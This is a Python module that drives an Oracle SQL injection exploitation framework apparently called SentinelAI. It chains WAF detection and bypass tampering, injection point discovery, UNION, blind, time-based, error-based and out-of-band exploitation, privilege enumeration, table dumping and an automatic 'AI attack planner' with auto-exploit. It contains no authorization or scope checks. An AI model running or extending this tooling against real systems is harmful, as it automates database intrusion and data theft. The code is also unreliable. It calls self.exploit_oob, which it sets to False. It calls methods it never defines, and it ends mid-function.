# app/modules/scanner/oracle_enum.py
"""
Oracle database detection for SentinelAI.
Phase 1: Oracle Detection Only.
Phase 2: Oracle Version Fingerprinting.
Phase 3: Oracle Schema Enumeration.
Phase 4: Oracle Data Extraction.
Phase 5: Oracle Privilege Enumeration.
Phase 6: Oracle Database & Environment Enumeration.
Phase 7: SQL Injection Detection.
Phase 8: Injection Point Discovery.
Phase 9: Column Count Detection & Reflective Discovery.
Phase 10: Data Type Detection.
Phase 11: Boolean-Based Blind SQL Injection Detection.
Phase 12: Time-Based Blind SQL Injection Detection.
Phase 13: Error-Based Exploitation Detection.
Phase 14: Web Application Firewall (WAF) Detection & Fingerprinting.
Phase 15: Payload Tamper Engine.
Phase 16: UNION Exploiter.
Phase 17: Automatic Database Dumper.
Phase 18: Blind Data Extraction Engine.
Phase 19: Out-of-Band (OOB) Exploitation Engine.
Phase 20: AI Attack Planner & Exploitation Orchestrator. (NEW)
"""

import logging
import typing
from dataclasses import dataclass, field
from typing import Any

import requests

from .attack_planner import AttackPlanner, AttackPlanResult, ExploitationStrategy
from .blind_boolean import BlindBooleanResult, OracleBlindBooleanEngine
from .blind_extractor import (
    BlindExtractionResult,
    BlindExtractor,
    ExtractionStatus,
    ExtractionTechnique,
)
from .blind_time import OracleTimeBlindEngine, TimeBlindResult
from .column_detector import ColumnDetectionResult, OracleColumnDetector
from .database_dumper import DatabaseDumpResult, OracleDatabaseDumper
from .datatype_detector import DataTypeDetectionResult, OracleDataTypeDetector
from .error_based import ErrorBasedResult, OracleErrorBasedEngine
from .html_parser import HTMLParser
from .injection_points import InjectionDiscoveryResult, InjectionPointDiscovery
from .oob_exploiter import OOBExploitResult, OOBStatus, OutOfBandExploiter
from .oracle_database import OracleDatabaseEnumerator, OracleDatabaseResult
from .oracle_extractor import OracleDataExtractor, OracleExtractionResult
from .oracle_privileges import OraclePrivilegeEnumerator, OraclePrivilegeResult
from .oracle_schema import OracleSchemaEnumerator, OracleSchemaResult
from .oracle_version import OracleVersionFingerprinter, OracleVersionResult
from .payloads import DetectionPayload, OracleDetectionPayloads
from .regex_utils import RegexUtils
from .sqli_detector import SQLiDetectionResult, SQLiDetector
from .tamper_engine import TamperEngine, TamperResult
from .union_exploiter import OracleUnionExploiter, UnionExploitResult
from .union_sqli import UnionSQLi
from .waf_detector import WAFDetectionResult, WAFDetector


@dataclass
class DetectionResult:
    """Result of Oracle detection."""

    is_oracle: bool = False
    score: int = 0
    threshold: int = 50
    indicators: dict[str, int] = field(default_factory=dict)
    reason: str = ""
    version_result: OracleVersionResult | None = None
    database_results: OracleDatabaseResult | None = None
    schema_result: OracleSchemaResult | None = None
    extraction_results: dict[str, OracleExtractionResult] | None = field(
        default_factory=dict
    )
    privilege_results: OraclePrivilegeResult | None = None
    sqli_result: SQLiDetectionResult | None = None
    injection_discovery: InjectionDiscoveryResult | None = None
    column_detection: ColumnDetectionResult | None = None
    datatype_detection: DataTypeDetectionResult | None = None
    blind_boolean_result: BlindBooleanResult | None = None
    time_blind_result: TimeBlindResult | None = None
    error_based_result: ErrorBasedResult | None = None
    waf_result: WAFDetectionResult | None = None
    tamper_result: TamperResult | None = None
    union_result: UnionExploitResult | None = None
    dump_result: DatabaseDumpResult | None = None

    # Phase 18: Blind extraction result
    blind_extract_result: BlindExtractionResult | None = None

    # Phase 19: OOB exploitation result
    oob_result: OOBExploitResult | None = None

    # Phase 20: Attack plan result
    attack_plan_result: AttackPlanResult | None = None

    def add_indicator(self, name: str, score: int) -> None:
        """Add an indicator and its score."""
        self.indicators[name] = score
        self.score += score

    def get_summary(self) -> str:
        """Get a summary of the detection result."""
        if self.is_oracle:
            base = f"Oracle detected (Score: {self.score}/{self.threshold})"

            if self.attack_plan_result and self.attack_plan_result.success:
                base = f"{base} - {self.attack_plan_result.get_summary()}"

            if self.oob_result and self.oob_result.success:
                base = f"{base} - {self.oob_result.get_summary()}"

            if self.blind_extract_result and self.blind_extract_result.success:
                base = f"{base} - {self.blind_extract_result.get_summary()}"

            if self.dump_result and self.dump_result.success:
                base = f"{base} - {self.dump_result.get_summary()}"
            if self.union_result and self.union_result.success:
                base = f"{base} - {self.union_result.get_summary()}"
            if self.tamper_result and self.tamper_result.success:
                base = f"{base} - {self.tamper_result.get_summary()}"
            if self.waf_result and self.waf_result.success:
                base = f"{base} - {self.waf_result.get_summary()}"
            if self.error_based_result and self.error_based_result.success:
                base = f"{base} - {self.error_based_result.get_summary()}"
            if self.time_blind_result and self.time_blind_result.success:
                base = f"{base} - {self.time_blind_result.get_summary()}"
            if self.blind_boolean_result and self.blind_boolean_result.success:
                base = f"{base} - {self.blind_boolean_result.get_summary()}"
            if self.datatype_detection and self.datatype_detection.success:
                base = f"{base} - {self.datatype_detection.get_summary()}"
            if self.column_detection and self.column_detection.success:
                base = f"{base} - {self.column_detection.get_summary()}"
            if self.injection_discovery and self.injection_discovery.success:
                base = f"{base} - {self.injection_discovery.get_summary()}"
            if self.sqli_result and self.sqli_result.success:
                base = f"{base} - {self.sqli_result.get_summary()}"
            if self.version_result and self.version_result.version:
                base = f"{base} - {self.version_result.get_summary()}"
            if self.database_results and self.database_results.success:
                base = f"{base} - {self.database_results.get_summary()}"
            if self.schema_result and self.schema_result.success:
                base = f"{base} - {self.schema_result.get_summary()}"
            if self.extraction_results:
                total_rows = sum(r.row_count for r in self.extraction_results.values())
                base = f"{base} - Extracted {total_rows} rows from {len(self.extraction_results)} tables"
            if self.privilege_results and self.privilege_results.success:
                base = f"{base} - {self.privilege_results.get_summary()}"
            return base
        else:
            return f"Oracle not detected (Score: {self.score}/{self.threshold})"

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging/output."""
        data = {
            "is_oracle": self.is_oracle,
            "score": self.score,
            "threshold": self.threshold,
            "indicators": self.indicators,
            "reason": self.reason,
        }

        if self.attack_plan_result:
            data["attack_plan"] = self.attack_plan_result.to_dict()

        if self.oob_result:
            data["oob"] = self.oob_result.to_dict()

        if self.blind_extract_result:
            data["blind_extract"] = self.blind_extract_result.to_dict()

        if self.dump_result:
            data["dump"] = self.dump_result.to_dict()
        if self.union_result:
            data["union"] = self.union_result.to_dict()
        if self.tamper_result:
            data["tamper"] = self.tamper_result.to_dict()
        if self.waf_result:
            data["waf"] = self.waf_result.to_dict()
        if self.error_based_result:
            data["error_based"] = self.error_based_result.to_dict()
        if self.time_blind_result:
            data["time_blind"] = self.time_blind_result.to_dict()
        if self.blind_boolean_result:
            data["blind_boolean"] = self.blind_boolean_result.to_dict()
        if self.datatype_detection:
            data["datatype_detection"] = self.datatype_detection.to_dict()
        if self.column_detection:
            data["column_detection"] = self.column_detection.to_dict()
        if self.injection_discovery:
            data["injection_discovery"] = self.injection_discovery.to_dict()
        if self.sqli_result:
            data["sqli"] = self.sqli_result.to_dict()
        if self.version_result:
            data["version"] = self.version_result.to_dict()
        if self.database_results:
            data["database"] = self.database_results.to_dict()
        if self.schema_result:
            data["schema"] = self.schema_result.to_dict()
        if self.extraction_results:
            data["extraction"] = {
                k: v.to_dict() for k, v in self.extraction_results.items()
            }
        if self.privilege_results:
            data["privileges"] = self.privilege_results.to_dict()
        return data


class OracleEnum:
    """
    Oracle database detection module.
    """

    # Detection thresholds and constants
    ORACLE_THRESHOLD = 50
    MIN_INDICATOR_SCORE = 5

    # Indicator weights - ClassVar for mutable class attributes
    INDICATOR_WEIGHTS: typing.ClassVar[dict[str, int]] = {
        "page_title_oracle": 10,
        "dual_success": 15,
        "v$version_success": 30,
        "oracle_error": 20,
        "oracle_keywords": 10,
        "all_tables_access": 20,
        "user_function": 15,
        "sysdate_function": 10,
        "rownum_success": 10,
        "response_significant_change": 15,
    }

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: logging.Logger | None = None,
    ):
        """Initialize OracleEnum module."""
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()
        self.payloads = OracleDetectionPayloads()

        self.version_fingerprinter = OracleVersionFingerprinter(
            session, base_url, logger
        )
        self.schema_enumerator = OracleSchemaEnumerator(session, base_url, logger)
        self.data_extractor = OracleDataExtractor(session, base_url, logger)
        self.privilege_enumerator = OraclePrivilegeEnumerator(session, base_url, logger)
        self.database_enumerator = OracleDatabaseEnumerator(session, base_url, logger)

        self.sqli_detector = SQLiDetector(session, base_url, logger)
        self.injection_discovery = InjectionPointDiscovery(session, base_url, logger)
        self.column_detector = OracleColumnDetector(session, base_url, logger)
        self.datatype_detector = OracleDataTypeDetector(session, base_url, logger)

        self.blind_boolean_engine = OracleBlindBooleanEngine(session, base_url, logger)
        self.time_blind_engine = OracleTimeBlindEngine(session, base_url, logger)
        self.error_based_engine = OracleErrorBasedEngine(session, base_url, logger)

        self.waf_detector = WAFDetector(session, base_url, logger)
        self.tamper_engine = TamperEngine(logger)
        self.union_exploiter = OracleUnionExploiter(session, base_url, logger)

        self.database_dumper = None
        self.blind_extractor = None
        self.extraction_results: list[BlindExtractionResult] = []
        self._current_injection_point = None

        self.oob_exploiter = None
        self.oob_query = None
        self.exploit_oob = False

        self.attack_planner = None

        self.baseline_response = None
        self.detection_result = None

        self.logger.info("[OracleEnum] Module initialized for Oracle detection")
        self.logger.info(f"[OracleEnum] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("OracleEnum")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    def _get_baseline(self, injection_point: str) -> requests.Response | None:
        """Get baseline response for comparison."""
        if self.baseline_response is None:
            self.logger.info("[OracleEnum] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.logger.info(
                    f"[OracleEnum] Baseline response length: {len(self.baseline_response.text)}"
                )
            else:
                self.logger.warning("[OracleEnum] Failed to get baseline response")

        return self.baseline_response

    def _check_page_title(self, response: requests.Response) -> int:
        """Check if page title contains Oracle indicators."""
        title = self.html_parser.get_page_title(response.text)
        if not title:
            return 0

        title_lower = title.lower()
        score = 0

        if "oracle" in title_lower:
            score += self.INDICATOR_WEIGHTS["page_title_oracle"]
            self.logger.info(f"[OracleEnum] Page title contains 'Oracle': {title}")

        if "database" in title_lower and (
            "error" in title_lower or "exception" in title_lower
        ):
            score += 5

        return score

    def _check_indicator_in_response(
        self, response: requests.Response, indicator: str
    ) -> bool:
        """Check if an indicator exists in the response."""
        if not response:
            return False

        return indicator.lower() in response.text.lower()

    def _extract_oracle_errors(self, response: requests.Response) -> list[str]:
        """Extract Oracle error codes from response."""
        return self.regex_utils.extract_oracle_errors(response.text)

    def _check_oracle_keywords(self, response: requests.Response) -> int:
        """Check for Oracle-specific keywords in response."""
        keywords = self.regex_utils.contains_oracle_keywords(response.text)

        if keywords:
            self.logger.info(f"[OracleEnum] Found Oracle keywords: {keywords}")
            base_score = self.INDICATOR_WEIGHTS["oracle_keywords"]
            bonus = len(keywords) * 2
            return min(base_score + bonus, 20)

        return 0

    def _analyze_response_change(
        self, response: requests.Response, baseline: requests.Response
    ) -> int:
        """Analyze significant changes between baseline and response."""
        if not baseline or not response:
            return 0

        diff = self.html_parser.response_diff(baseline.text, response.text)

        if diff.get("significant_change", False):
            self.logger.info("[OracleEnum] Significant response change detected")
            self.logger.info(
                f"[OracleEnum] Response length diff: {diff.get('length_diff', 0)}"
            )
            self.logger.info(
                f"[OracleEnum] New words count: {len(diff.get('new_words', []))}"
            )

            new_text = " ".join(diff.get("new_words", []))
            oracle_keywords = self.regex_utils.contains_oracle_keywords(new_text)

            if oracle_keywords:
                self.logger.info(
                    f"[OracleEnum] Oracle keywords in new content: {oracle_keywords}"
                )
                return self.INDICATOR_WEIGHTS["response_significant_change"] + 5

            return self.INDICATOR_WEIGHTS["response_significant_change"]

        return 0

    def _test_payload(
        self, injection_point: str, payload: DetectionPayload
    ) -> dict[str, Any]:
        """Test a single payload and evaluate response."""
        self.logger.info(f"[OracleEnum] Testing: {payload.description}")
        self.logger.info(f"[OracleEnum] Payload: {payload.payload}")

        baseline = self._get_baseline(injection_point)

        result = self.union_sqli.test_payload(
            injection_point, payload.payload, baseline
        )

        if not result["success"] or result.get("response") is None:
            self.logger.warning(
                f"[OracleEnum] Payload test failed: {payload.description}"
            )
            return {"success": False, "score": 0, "response": None}

        response = result["response"]

        score = 0
        indicators = []

        if payload.success_indicator and self._check_indicator_in_response(
            response, payload.success_indicator
        ):
            score += payload.weight
            indicators.append(f"{payload.success_indicator} found")

        errors = self._extract_oracle_errors(response)
        if errors:
            error_score = self.INDICATOR_WEIGHTS["oracle_error"]
            score += error_score
            indicators.append(f"Oracle errors: {errors}")

        keyword_score = self._check_oracle_keywords(response)
        if keyword_score:
            score += keyword_score
            indicators.append("Oracle keywords found")

        if baseline and result["has_changed"]:
            change_score = self._analyze_response_change(response, baseline)
            if change_score:
                score += change_score
                indicators.append("Significant response change")

        if "dual" in payload.payload.lower() and self._check_indicator_in_response(
            response, "dual"
        ):
            score += 5

        if "v$version" in payload.payload.lower() and self._check_indicator_in_response(
            response, "Oracle"
        ):
            score += 10

        self.logger.info(f"[OracleEnum] Score for payload: {score}")
        self.logger.info(f"[OracleEnum] Indicators: {indicators}")

        return {
            "success": True,
            "score": score,
            "response": response,
            "indicators": indicators,
            "description": payload.description,
        }

    def detect(
        self,
        injection_point: str,
        detect_waf: bool = True,
        detect_sqli: bool = True,
        discover_parameters: bool = True,
        detect_columns: bool = True,
        detect_datatypes: bool = True,
        detect_blind_boolean: bool = True,
        detect_time_blind: bool = True,
        detect_error_based: bool = True,
        exploit_union: bool = True,
        fingerprint_version: bool = True,
        enumerate_database: bool = True,
        enumerate_schema: bool = True,
        enumerate_privileges: bool = True,
        extract_data: bool = False,
        blind_extract: bool = False,
        blind_target_type: str = "all",
        blind_target_name: str | None = None,
        blind_max_items: int = 1000,
        exploit_oob: bool = False,
        oob_query: str | None = None,
        oob_techniques: list | None = None,
        oob_auto_detect: bool = True,
        create_attack_plan: bool = True,
        auto_exploit: bool = False,
        auto_exploit_query: str | None = None,
    ) -> DetectionResult:
        """Main detection method for Oracle."""
        self.logger.info(
            "[OracleEnum] =================================================="
        )
        self.logger.info("[OracleEnum] ORACLE DETECTION PHASE 1")
        self.logger.info(
            "[OracleEnum] =================================================="
        )

        self._current_injection_point = injection_point
        result = DetectionResult(is_oracle=False, threshold=self.ORACLE_THRESHOLD)

        # Phase 14: WAF Detection
        if detect_waf:
            self.logger.info(
                "[OracleEnum] WAF detection enabled - Starting WAF detection..."
            )
            try:
                waf_result = self.waf_detector.detect(injection_point)
                result.waf_result = waf_result
                self.logger.info(
                    f"[OracleEnum] WAF detection complete: {waf_result.get_summary()}"
                )

                if waf_result.waf_detected:
                    self.logger.info(
                        f"[OracleEnum] WAF detected: {waf_result.waf_name} (Confidence: {waf_result.confidence}%)"
                    )
                    self.logger.info(
                        f"[OracleEnum] Bypass recommendations: {len(waf_result.bypass_recommendations)} available"
                    )

                    if waf_result.waf_name:
                        recommended_tampers = self.tamper_engine.recommend_tampers(
                            waf_result.waf_name
                        )
                        self.logger.info(
                            f"[OracleEnum] Recommended tampers for {waf_result.waf_name}: {recommended_tampers}"
                        )
            except (ValueError, TypeError, AttributeError) as e:
                self.logger.error(f"[OracleEnum] WAF detection failed: {e!s}")

        # Phase 8: Injection Point Discovery
        if discover_parameters:
            self.logger.info(
                "[OracleEnum] Injection point discovery enabled - Starting discovery..."
            )
            try:
                discovery_result = self.injection_discovery.discover_all(
                    url=self.base_url, test_parameters=False
                )
                result.injection_discovery = discovery_result
                self.logger.info(
                    f"[OracleEnum] Injection point discovery complete: {discovery_result.get_summary()}"
                )

                best_param = discovery_result.get_best_parameter()
                if best_param and best_param.parameter_name:
                    injection_point = best_param.parameter_name
                    self.logger.info(
                        f"[OracleEnum] Using best parameter: {injection_point}"
                    )
                    self._current_injection_point = injection_point
            except (ValueError, TypeError, AttributeError) as e:
                self.logger.error(
                    f"[OracleEnum] Injection point discovery failed: {e!s}"
                )

        # Phase 9: Column Detection
        if detect_columns:
            self.logger.info(
                "[OracleEnum] Column detection enabled - Starting column detection..."
            )
            try:
                column_result = self.column_detector.detect_column_count(
                    injection_point
                )
                result.column_detection = column_result
                self.logger.info(
                    f"[OracleEnum] Column detection complete: {column_result.get_summary()}"
                )

                if column_result.success and column_result.reflective_columns:
                    self.logger.info(
                        f"[OracleEnum] Found {len(column_result.reflective_columns)} reflective columns"
                    )
                    if column_result.union_payload:
                        self.logger.info(
                            f"[OracleEnum] Best UNION payload: {column_result.union_payload[:50]}..."
                        )
            except (ValueError, TypeError, AttributeError) as e:
                self.logger.error(f"[OracleEnum] Column detection failed: {e!s}")

        # Phase 10: Data Type Detection
        if (
            detect_datatypes
            and result.column_detection
            and result.column_detection.success
        ):
            self.logger.info(
                "[OracleEnum] Data type detection enabled - Starting data type detection..."
            )
            try:
                column_count = result.column_detection.column_count
                datatype_result = self.datatype_detector.detect_column_types(
                    injection_point, column_count
                )
                result.datatype_detection = datatype_result
                self.logger.info(
                    f"[OracleEnum] Data type detection complete: {datatype_result.get_summary()}"
                )

                if datatype_result.success and datatype_result.working_union_payload:
                    self.logger.info(
                        f"[OracleEnum] Best UNION payload: {datatype_result.working_union_payload[:50]}..."
                    )
            except (ValueError, TypeError, AttributeError) as e:
                self.logger.error(f"[OracleEnum] Data type detection failed: {e!s}")

        # Phase 11: Blind Boolean Detection
        if detect_blind_boolean:
            self.logger.info(
                "[OracleEnum] Blind boolean detection enabled - Starting detection..."
            )
            try:
                blind_result = self.blind_boolean_engine.detect_boolean_blind(
                    injection_point
                )
                result.blind_boolean_result = blind_result
                self.logger.info(
                    f"[OracleEnum] Blind boolean detection complete: {blind_result.get_summary()}"
                )

                if blind_result.is_vulnerable:
                    self.logger.info(
                        "[OracleEnum] Boolean blind SQL injection confirmed!"
                    )
                    self.logger.info(
                        f"[OracleEnum] Best true payload: {blind_result.best_true_payload}"
                    )
                    self.logger.info(
                        f"[OracleEnum] Best false payload: {blind_result.best_false_payload}"
                    )
            except (ValueError, TypeError, AttributeError) as e:
                self.logger.error(f"[OracleEnum] Blind boolean detection failed: {e!s}")

        # Phase 12: Time Blind Detection
        if detect_time_blind:
            self.logger.info(
                "[OracleEnum] Time blind detection enabled - Starting detection..."
            )
            try:
                time_result = self.time_blind_engine.detect_time_blind(injection_point)
                result.time_blind_result = time_result
                self.logger.info(
                    f"[OracleEnum] Time blind detection complete: {time_result.get_summary()}"
                )

                if time_result.is_vulnerable:
                    self.logger.info(
                        "[OracleEnum] Time-based blind SQL injection confirmed!"
                    )
                    self.logger.info(
                        f"[OracleEnum] Delay: {time_result.delay_seconds:.2f}s"
                    )
                    self.logger.info(
                        f"[OracleEnum] Best payload: {time_result.best_payload}"
                    )
            except (ValueError, TypeError, AttributeError) as e:
                self.logger.error(f"[OracleEnum] Time blind detection failed: {e!s}")

        # Phase 13: Error Based Detection
        if detect_error_based:
            self.logger.info(
                "[OracleEnum] Error-based detection enabled - Starting detection..."
            )
            try:
                error_result = self.error_based_engine.detect_error_based(
                    injection_point
                )
                result.error_based_result = error_result
                self.logger.info(
                    f"[OracleEnum] Error-based detection complete: {error_result.get_summary()}"
                )

                if error_result.is_vulnerable:
                    self.logger.info(
                        "[OracleEnum] Error-based SQL injection confirmed!"
                    )
                    self.logger.info(
                        f"[OracleEnum] Best payload: {error_result.best_payload}"
                    )
                    if error_result.extracted_values:
                        self.logger.info(
                            f"[OracleEnum] Extracted values: {list(error_result.extracted_values.values())[:3]}"
                        )
            except (ValueError, TypeError, AttributeError) as e:
                self.logger.error(f"[OracleEnum] Error-based detection failed: {e!s}")

        # Phase 16: UNION Exploitation
        if exploit_union:
            self.logger.info(
                "[OracleEnum] UNION exploitation enabled - Starting exploitation..."
            )
            try:
                waf_name = None
                if result.waf_result and result.waf_result.waf_detected:
                    waf_name = result.waf_result.waf_name

                union_result = self.union_exploiter.exploit(injection_point, waf_name)
                result.union_result = union_result
                self.logger.info(
                    f"[OracleEnum] UNION exploitation complete: {union_result.get_summary()}"
                )

                if union_result.success:
                    self.logger.info(
                        f"[OracleEnum] Working payload: {union_result.payload}"
                    )
                    self.logger.info(
                        f"[OracleEnum] Column count: {union_result.column_count}"
                    )
            except (ValueError, TypeError, AttributeError) as e:
                self.logger.error(f"[OracleEnum] UNION exploitation failed: {e!s}")

        # Phase 7: SQL Injection Detection
        if detect_sqli:
            self.logger.info(
                "[OracleEnum] SQL Injection detection enabled - Starting detection..."
            )
            try:
                sqli_result = self.sqli_detector.detect(injection_point)
                result.sqli_result = sqli_result
                self.logger.info(
                    f"[OracleEnum] SQL Injection detection complete: {sqli_result.get_summary()}"
                )

                if sqli_result.success and sqli_result.confidence < 40:
                    self.logger.warning(
                        "[OracleEnum] Low confidence SQL injection detected, continuing..."
                    )
                elif not sqli_result.success:
                    self.logger.info(
                        "[OracleEnum] No SQL injection detected with high confidence"
                    )
            except (ValueError, TypeError, AttributeError) as e:
                self.logger.error(f"[OracleEnum] SQL Injection detection failed: {e!s}")

        # Step 1: Check page title
        self.logger.info("[OracleEnum] Step 1: Checking page title...")
        baseline = self._get_baseline(injection_point)
        if baseline:
            title_score = self._check_page_title(baseline)
            if title_score:
                result.add_indicator("page_title_oracle", title_score)
                self.logger.info(f"[OracleEnum] Page title score: +{title_score}")

        # Step 2: Test all payloads
        self.logger.info("[OracleEnum] Step 2: Testing detection payloads...")
        payload_results = []

        for payload in self.payloads.get_all_payloads():
            test_result = self._test_payload(injection_point, payload)
            if test_result["success"] and test_result["score"] > 0:
                payload_results.append(test_result)
                result.add_indicator(
                    f"payload_{payload.description[:20]}", test_result["score"]
                )
                self.logger.info(f"[OracleEnum] Total score: +{test_result['score']}")

        # Step 3: Additional checks
        self.logger.info("[OracleEnum] Step 3: Additional checks...")

        if baseline:
            errors = self._extract_oracle_errors(baseline)
            if errors:
                result.add_indicator("oracle_errors_in_baseline", 10)
                self.logger.info("[OracleEnum] Oracle errors in baseline: +10")

        # Determine if Oracle is detected
        result.is_oracle = result.score >= result.threshold

        # Set reason
        if result.is_oracle:
            top_indicators = sorted(
                result.indicators.items(), key=lambda x: x[1], reverse=True
            )[:3]
            reasons = [f"{name} (+{score})" for name, score in top_indicators]
            result.reason = f"Oracle detected based on indicators: {', '.join(reasons)}"

            # Phase 2: Version Fingerprinting
            if fingerprint_version:
                self.logger.info(
                    "[OracleEnum] Oracle detected - Starting version fingerprinting..."
                )
                try:
                    version_result = self.version_fingerprinter.fingerprint(
                        injection_point
                    )
                    result.version_result = version_result
                    self.logger.info(
                        f"[OracleEnum] Version fingerprinting complete: {version_result.get_summary()}"
                    )
                except (ValueError, TypeError, AttributeError) as e:
                    self.logger.error(
                        f"[OracleEnum] Version fingerprinting failed: {e!s}"
                    )

            # Phase 6: Database Enumeration
            if enumerate_database:
                self.logger.info(
                    "[OracleEnum] Database enumeration enabled - Starting database enumeration..."
                )
                try:
                    database_result = self.database_enumerator.enumerate_all(
                        injection_point
                    )
                    result.database_results = database_result
                    self.logger.info(
                        f"[OracleEnum] Database enumeration complete: {database_result.get_summary()}"
                    )
                except (ValueError, TypeError, AttributeError) as e:
                    self.logger.error(
                        f"[OracleEnum] Database enumeration failed: {e!s}"
                    )

            # Phase 3: Schema Enumeration
            if enumerate_schema:
                self.logger.info(
                    "[OracleEnum] Oracle detected - Starting schema enumeration..."
                )
                try:
                    schema_result = self.schema_enumerator.enumerate_all(
                        injection_point
                    )
                    result.schema_result = schema_result
                    self.logger.info(
                        f"[OracleEnum] Schema enumeration complete: {schema_result.get_summary()}"
                    )
                except (ValueError, TypeError, AttributeError) as e:
                    self.logger.error(f"[OracleEnum] Schema enumeration failed: {e!s}")

            # Phase 5: Privilege Enumeration
            if enumerate_privileges:
                self.logger.info(
                    "[OracleEnum] Privilege enumeration enabled - Starting privilege enumeration..."
                )
                try:
                    privilege_result = self.privilege_enumerator.enumerate_all(
                        injection_point
                    )
                    result.privilege_results = privilege_result
                    self.logger.info(
                        f"[OracleEnum] Privilege enumeration complete: {privilege_result.get_summary()}"
                    )
                except (ValueError, TypeError, AttributeError) as e:
                    self.logger.error(
                        f"[OracleEnum] Privilege enumeration failed: {e!s}"
                    )

            # Phase 4: Data Extraction
            if extract_data and result.schema_result:
                self.logger.info(
                    "[OracleEnum] Data extraction enabled - Starting data extraction..."
                )
                try:
                    extraction_results = {}
                    for schema, tables in result.schema_result.tables.items():
                        for table in tables[:5]:
                            try:
                                self.logger.info(
                                    f"[OracleEnum] Extracting data from: {schema}.{table}"
                                )
                                extract_result = self.data_extractor.extract_table(
                                    injection_point, schema, table, max_rows=100
                                )
                                extraction_results[f"{schema}.{table}"] = extract_result
                                self.logger.info(
                                    f"[OracleEnum] Extracted {extract_result.row_count} rows from {schema}.{table}"
                                )
                            except (ValueError, TypeError, AttributeError) as e:
                                self.logger.error(
                                    f"[OracleEnum] Data extraction failed for {schema}.{table}: {e!s}"
                                )

                    result.extraction_results = extraction_results
                    self.logger.info(
                        f"[OracleEnum] Data extraction complete: {len(extraction_results)} tables"
                    )
                except (ValueError, TypeError, AttributeError) as e:
                    self.logger.error(f"[OracleEnum] Data extraction failed: {e!s}")

            # Phase 18: Blind Extraction
            if blind_extract:
                self.logger.info(
                    "[OracleEnum] Blind extraction enabled - Starting blind extraction..."
                )
                try:
                    blind_result = self.extract_blind_all(
                        injection_point=injection_point,
                        target_type=blind_target_type,
                        target_name=blind_target_name,
                        max_items=blind_max_items,
                        auto_detect_technique=True,
                    )
                    result.blind_extract_result = blind_result

                    if blind_result.success:
                        self.logger.info(
                            f"[OracleEnum] Blind extraction complete: {blind_result.get_summary()}"
                        )
                        self.logger.info(
                            f"[OracleEnum] Extracted {len(blind_result.extracted_items)} items"
                        )
                    else:
                        self.logger.warning(
                            f"[OracleEnum] Blind extraction failed: {blind_result.errors[0] if blind_result.errors else 'Unknown error'}"
                        )
                except (ValueError, TypeError, AttributeError) as e:
                    self.logger.error(f"[OracleEnum] Blind extraction failed: {e!s}")
                    result.blind_extract_result = BlindExtractionResult(
                        success=False, errors=[str(e)], status=ExtractionStatus.FAILED
                    )

            # Phase 19: OOB Exploitation
            if exploit_oob:
                self.logger.info(
                    "[OracleEnum] OOB exploitation enabled - Starting OOB exploitation..."
                )
                try:
                    oob_result = self.exploit_oob(
                        injection_point=injection_point,
                        query=oob_query or "SELECT USER FROM dual",
                        techniques=oob_techniques,
                        auto_detect=oob_auto_detect,
                    )
                    result.oob_result = oob_result

                    if oob_result.success:
                        self.logger.info(
                            f"[OracleEnum] OOB exploitation complete: {oob_result.get_summary()}"
                        )
                        self.logger.info(
                            f"[OracleEnum] Data extracted: {oob_result.extracted_data}"
                        )
                    else:
                        self.logger.warning(
                            f"[OracleEnum] OOB exploitation failed: {oob_result.errors[0] if oob_result.errors else 'Unknown error'}"
                        )
                except (ValueError, TypeError, AttributeError) as e:
                    self.logger.error(f"[OracleEnum] OOB exploitation failed: {e!s}")
                    result.oob_result = OOBExploitResult(
                        success=False, errors=[str(e)], status=OOBStatus.FAILED
                    )

            # Phase 20: AI Attack Planning & Auto Exploitation
            if create_attack_plan:
                self.logger.info("[OracleEnum] Creating attack plan...")
                try:
                    attack_plan = self.plan_attack(
                        injection_point=injection_point,
                        version_result=result.version_result,
                        schema_result=result.schema_result,
                        privilege_result=result.privilege_results,
                        database_result=result.database_results,
                        sqli_result=result.sqli_result,
                        column_result=result.column_detection,
                        datatype_result=result.datatype_detection,
                        blind_boolean_result=result.blind_boolean_result,
                        time_blind_result=result.time_blind_result,
                        error_based_result=result.error_based_result,
                        waf_result=result.waf_result,
                        blind_extract_result=result.blind_extract_result,
                        oob_result=result.oob_result,
                    )
                    result.attack_plan_result = attack_plan

                    if attack_plan.success:
                        self.logger.info(
                            f"[OracleEnum] Attack plan created: {attack_plan.get_summary()}"
                        )
                    else:
                        self.logger.warning(
                            f"[OracleEnum] Attack plan creation failed: {attack_plan.reasoning}"
                        )
                except (ValueError, TypeError, AttributeError) as e:
                    self.logger.error(
                        f"[OracleEnum] Attack plan creation failed: {e!s}"
                    )
                    result.attack_plan_result = AttackPlanResult(
                        success=False,
                        reasoning=[f"Attack plan creation failed: {e!s}"],
                    )

                if (
                    auto_exploit
                    and result.attack_plan_result
                    and result.attack_plan_result.success
                ):
                    self.logger.info(
                        "[OracleEnum] Auto-exploitation enabled - Starting automatic exploitation..."
                    )
                    try:
                        auto_results = self.auto_exploit(
                            injection_point=injection_point,
                            query=auto_exploit_query or "SELECT USER FROM dual",
                        )

                        if auto_results.get("success"):
                            self.logger.info(
                                f"[OracleEnum] Auto-exploitation successful! Strategy: {auto_results.get('strategy_used')}"
                            )
                            if auto_results.get("data"):
                                self.logger.info(
                                    f"[OracleEnum] Extracted data: {auto_results['data']}"
                                )
                        else:
                            self.logger.warning(
                                f"[OracleEnum] Auto-exploitation failed: {auto_results.get('error', 'Unknown error')}"
                            )
                    except (ValueError, TypeError, AttributeError) as e:
                        self.logger.error(
                            f"[OracleEnum] Auto-exploitation failed: {e!s}"
                        )
        else:
            result.reason = f"Score {result.score} below threshold {result.threshold}"

        # Log final result
        self.logger.info(
            "[OracleEnum] =================================================="
        )
        self.logger.info("[OracleEnum] DETECTION COMPLETE")
        self.logger.info(f"[OracleEnum] Total Score: {result.score}")
        self.logger.info(f"[OracleEnum] Threshold: {result.threshold}")
